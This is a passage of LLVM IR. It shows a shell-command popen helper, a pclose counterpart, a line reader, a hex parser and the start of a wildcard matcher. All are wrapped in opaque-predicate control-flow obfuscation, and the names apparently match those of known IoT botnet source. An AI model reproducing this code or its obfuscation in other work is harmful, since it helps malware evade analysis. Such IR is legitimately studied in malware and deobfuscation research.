  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %60, label %69, label %70

; <label>:69:                                     ; preds = %originalBBpart24
  store i32 -1, i32* %3, align 4
  br label %237

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = mul i64 %72, 4
  %74 = trunc i64 %73 to i32
  %75 = zext i32 %74 to i64
  %76 = call noalias i8* @malloc(i64 %75) #4
  %77 = bitcast i8* %76 to i32*
  store i32* %77, i32** @fdopen_pids, align 8
  %78 = icmp eq i32* %77, null
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 -1, i32* %3, align 4
  br label %237

; <label>:80:                                     ; preds = %70
  %81 = load i32, i32* @x.23
  %82 = load i32, i32* @y.24
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %80
  %89 = load i32*, i32** @fdopen_pids, align 8
  %90 = bitcast i32* %89 to i8*
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = mul i64 %92, 4
  call void @llvm.memset.p0i8.i64(i8* %90, i8 0, i64 %93, i32 1, i1 false)
  %94 = load i32, i32* @x.23
  %95 = load i32, i32* @y.24
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %102

; <label>:102:                                    ; preds = %originalBBpart28, %47
  %103 = call i32 @vfork() #11
  store i32 %103, i32* %9, align 4
  switch i32 %103, label %197 [
    i32 -1, label %104
    i32 0, label %111
  ]

; <label>:104:                                    ; preds = %102
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  %107 = call i32 @close(i32 %106)
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1, i32* %3, align 4
  br label %237

; <label>:111:                                    ; preds = %102
  %112 = load i32, i32* @x.23
  %113 = load i32, i32* @y.24
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 114
  %124 = load i32, i32* @x.23
  %125 = load i32, i32* @y.24
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %123, label %132, label %163

; <label>:132:                                    ; preds = %originalBBpart212
  %133 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %134 = load i32, i32* %133, align 4
  %135 = icmp ne i32 %134, 1
  br i1 %135, label %136, label %159

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* @x.23
  %138 = load i32, i32* @y.24
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %136
  %145 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @dup2(i32 %146, i32 1) #4
  %148 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @close(i32 %149)
  %151 = load i32, i32* @x.23
  %152 = load i32, i32* @y.24
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %159

; <label>:159:                                    ; preds = %originalBBpart216, %132
  %160 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @close(i32 %161)
  br label %194

; <label>:163:                                    ; preds = %originalBBpart212
  %164 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %165 = load i32, i32* %164, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %174

; <label>:167:                                    ; preds = %163
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @dup2(i32 %169, i32 0) #4
  %171 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @close(i32 %172)
  br label %174

; <label>:174:                                    ; preds = %167, %163
  %175 = load i32, i32* @x.23
  %176 = load i32, i32* @y.24
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @close(i32 %184)
  %186 = load i32, i32* @x.23
  %187 = load i32, i32* @y.24
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %194

; <label>:194:                                    ; preds = %originalBBpart220, %159
  %195 = load i8*, i8** %4, align 8
  %196 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %195, i8* null) #4
  call void @_exit(i32 127) #12
  unreachable

; <label>:197:                                    ; preds = %102
  %198 = load i32, i32* @x.23
  %199 = load i32, i32* @y.24
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %197
  %206 = load i8*, i8** %5, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 114
  %210 = load i32, i32* @x.23
  %211 = load i32, i32* @y.24
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %209, label %218, label %224

; <label>:218:                                    ; preds = %originalBBpart224
  %219 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %220 = load i32, i32* %219, align 4
  store i32 %220, i32* %6, align 4
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %230

; <label>:224:                                    ; preds = %originalBBpart224
  %225 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %226 = load i32, i32* %225, align 4
  store i32 %226, i32* %6, align 4
  %227 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @close(i32 %228)
  br label %230

; <label>:230:                                    ; preds = %224, %218
  %231 = load i32, i32* %9, align 4
  %232 = load i32*, i32** @fdopen_pids, align 8
  %233 = load i32, i32* %6, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i32, i32* %232, i64 %234
  store i32 %231, i32* %235, align 4
  %236 = load i32, i32* %6, align 4
  store i32 %236, i32* %3, align 4
  br label %237

; <label>:237:                                    ; preds = %230, %104, %79, %69, %46, %originalBBpart2
  %238 = load i32, i32* @x.23
  %239 = load i32, i32* @y.24
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %237
  %246 = load i32, i32* %3, align 4
  %247 = load i32, i32* @x.23
  %248 = load i32, i32* @y.24
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  ret i32 %246

originalBBalteredBB:                              ; preds = %originalBB, %25
  store i32 -1, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %255 = call i32 @getdtablesize() #4
  store i32 %255, i32* %8, align 4
  %256 = icmp sle i32 %255, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %80
  %257 = load i32*, i32** @fdopen_pids, align 8
  %258 = bitcast i32* %257 to i8*
  %259 = load i32, i32* %8, align 4
  %260 = sext i32 %259 to i64
  %_ = sub i64 0, %260
  %gen = add i64 %_, 4
  %261 = mul i64 %260, 4
  call void @llvm.memset.p0i8.i64(i8* %258, i8 0, i64 %261, i32 1, i1 false)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %262 = load i8*, i8** %5, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 114
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %136
  %266 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %267 = load i32, i32* %266, align 4
  %268 = call i32 @dup2(i32 %267, i32 1) #4
  %269 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %270 = load i32, i32* %269, align 4
  %271 = call i32 @close(i32 %270)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %272 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @close(i32 %273)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %197
  %275 = load i8*, i8** %5, align 8
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 114
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %237
  %279 = load i32, i32* %3, align 4
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = load i32, i32* @x.25
  %3 = load i32, i32* @y.26
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.__sigset_t, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %11, align 4
  %18 = load i32*, i32** @fdopen_pids, align 8
  %19 = icmp eq i32* %18, null
  %20 = load i32, i32* @x.25
  %21 = load i32, i32* @y.26
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %35, label %28

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %11, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %28, %originalBBpart2
  store i32 -1, i32* %10, align 4
  br label %110

; <label>:36:                                     ; preds = %28
  %37 = load i32, i32* %11, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @sigemptyset(%struct.__sigset_t* %14) #4
  %40 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 2) #4
  %41 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 3) #4
  %42 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 1) #4
  %43 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %14, %struct.__sigset_t* %13) #4
  br label %44

; <label>:44:                                     ; preds = %74, %36
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %11, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %15, i32 0)
  store i32 %50, i32* %16, align 4
  br label %51

; <label>:51:                                     ; preds = %44
  %52 = load i32, i32* %16, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %74

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.25
  %56 = load i32, i32* @y.26
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = call i32* @__errno_location() #13
  %64 = load i32, i32* %63, align 4
  %65 = icmp eq i32 %64, 4
  %66 = load i32, i32* @x.25
  %67 = load i32, i32* @y.26
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:74:                                     ; preds = %originalBBpart24, %51
  %75 = phi i1 [ false, %51 ], [ %65, %originalBBpart24 ]
  br i1 %75, label %44, label %76

; <label>:76:                                     ; preds = %74
  %77 = load i32, i32* @x.25
  %78 = load i32, i32* @y.26
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #4
  %86 = load i32*, i32** @fdopen_pids, align 8
  %87 = load i32, i32* %12, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  store i32 0, i32* %89, align 4
  %90 = load i32, i32* %16, align 4
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.25
  %93 = load i32, i32* @y.26
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %91, label %100, label %101

; <label>:100:                                    ; preds = %originalBBpart28
  br label %108

; <label>:101:                                    ; preds = %originalBBpart28
  %102 = bitcast %struct.in_addr* %17 to i32*
  %103 = load i32, i32* %15, align 4
  store i32 %103, i32* %102, align 4
  %104 = bitcast %struct.in_addr* %17 to i32*
  %105 = load i32, i32* %104, align 4
  %106 = and i32 %105, 65280
  %107 = ashr i32 %106, 8
  br label %108

; <label>:108:                                    ; preds = %101, %100
  %109 = phi i32 [ -1, %100 ], [ %107, %101 ]
  store i32 %109, i32* %10, align 4
  br label %110

; <label>:110:                                    ; preds = %108, %35
  %111 = load i32, i32* %10, align 4
  ret i32 %111

originalBBalteredBB:                              ; preds = %originalBB, %1
  %112 = alloca i32, align 4
  %113 = alloca i32, align 4
  %114 = alloca i32, align 4
  %115 = alloca %struct.__sigset_t, align 8
  %116 = alloca %struct.__sigset_t, align 8
  %117 = alloca i32, align 4
  %118 = alloca i32, align 4
  %119 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %113, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = icmp eq i32* %120, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %122 = call i32* @__errno_location() #13
  %123 = load i32, i32* %122, align 4
  %124 = icmp eq i32 %123, 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %125 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #4
  %126 = load i32*, i32** @fdopen_pids, align 8
  %127 = load i32, i32* %12, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i32, i32* %126, i64 %128
  store i32 0, i32* %129, align 4
  %130 = load i32, i32* %16, align 4
  %131 = icmp eq i32 %130, -1
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %3
  %10 = load i32, i32* @x.27
  %11 = load i32, i32* @y.28
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i32, i32* %7, align 4
  %19 = icmp eq i32 %18, 1
  %20 = load i32, i32* @x.27
  %21 = load i32, i32* @y.28
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %41

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %5, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %4, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 10
  br label %41

; <label>:41:                                     ; preds = %32, %28, %originalBBpart2
  %42 = phi i1 [ false, %28 ], [ false, %originalBBpart2 ], [ %40, %32 ]
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %4, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* %8, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %8, align 4
  br label %9

; <label>:53:                                     ; preds = %41
  %54 = load i32, i32* @x.27
  %55 = load i32, i32* @y.28
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %7, align 4
  %63 = icmp eq i32 %62, 0
  %64 = load i32, i32* @x.27
  %65 = load i32, i32* @y.28
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %73

; <label>:72:                                     ; preds = %originalBBpart24
  br label %75

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i8*, i8** %4, align 8
  br label %75

; <label>:75:                                     ; preds = %73, %72
  %76 = phi i8* [ null, %72 ], [ %74, %73 ]
  ret i8* %76

originalBBalteredBB:                              ; preds = %originalBB, %9
  %77 = load i32, i32* %7, align 4
  %78 = icmp eq i32 %77, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %79 = load i32, i32* %7, align 4
  %80 = icmp eq i32 %79, 0
  br label %originalBB1
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = load i32, i32* @x.29
  %3 = load i32, i32* @y.30
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i8* %0, i8** %10, align 8
  store i64 0, i64* %11, align 8
  %12 = load i32, i32* @x.29
  %13 = load i32, i32* @y.30
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %originalBBpart216, %originalBBpart2
  %21 = load i32, i32* @x.29
  %22 = load i32, i32* @y.30
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %20
  %29 = load i8*, i8** %10, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  %33 = load i32, i32* @x.29
  %34 = load i32, i32* @y.30
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %44

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i64, i64* %11, align 8
  %43 = icmp sge i64 %42, 0
  br label %44

; <label>:44:                                     ; preds = %41, %originalBBpart24
  %45 = phi i1 [ false, %originalBBpart24 ], [ %43, %41 ]
  %46 = load i32, i32* @x.29
  %47 = load i32, i32* @y.30
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %54 = load i32, i32* @x.29
  %55 = load i32, i32* @y.30
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %45, label %62, label %88

; <label>:62:                                     ; preds = %originalBBpart28
  %63 = load i32, i32* @x.29
  %64 = load i32, i32* @y.30
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %62
  %71 = load i64, i64* %11, align 8
  %72 = shl i64 %71, 4
  %73 = load i8*, i8** %10, align 8
  %74 = getelementptr inbounds i8, i8* %73, i32 1
  store i8* %74, i8** %10, align 8
  %75 = load i8, i8* %73, align 1
  %76 = zext i8 %75 to i64
  %77 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %76
  %78 = load i64, i64* %77, align 8
  %79 = or i64 %72, %78
  store i64 %79, i64* %11, align 8
  %80 = load i32, i32* @x.29
  %81 = load i32, i32* @y.30
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart216, label %originalBB10alteredBB

originalBBpart216:                                ; preds = %originalBB10
  br label %20

; <label>:88:                                     ; preds = %originalBBpart28
  %89 = load i64, i64* %11, align 8
  ret i64 %89

originalBBalteredBB:                              ; preds = %originalBB, %1
  %90 = alloca i8*, align 8
  %91 = alloca i64, align 8
  store i8* %0, i8** %90, align 8
  store i64 0, i64* %91, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %20
  %92 = load i8*, i8** %10, align 8
  %93 = load i8, i8* %92, align 1
  %94 = zext i8 %93 to i32
  %95 = icmp ne i32 %94, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %62
  %96 = load i64, i64* %11, align 8
  %_ = sub i64 %96, 4
  %gen = mul i64 %_, 4
  %97 = shl i64 %96, 4
  %98 = load i8*, i8** %10, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %10, align 8
  %100 = load i8, i8* %98, align 1
  %101 = zext i8 %100 to i64
  %102 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %101
  %103 = load i64, i64* %102, align 8
  %_11 = sub i64 0, %97
  %gen12 = add i64 %_11, %103
  %_13 = sub i64 %97, %103
  %gen14 = mul i64 %_13, %103
  %104 = or i64 %97, %103
  store i64 %104, i64* %11, align 8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %118 [
    i32 0, label %9
    i32 42, label %13
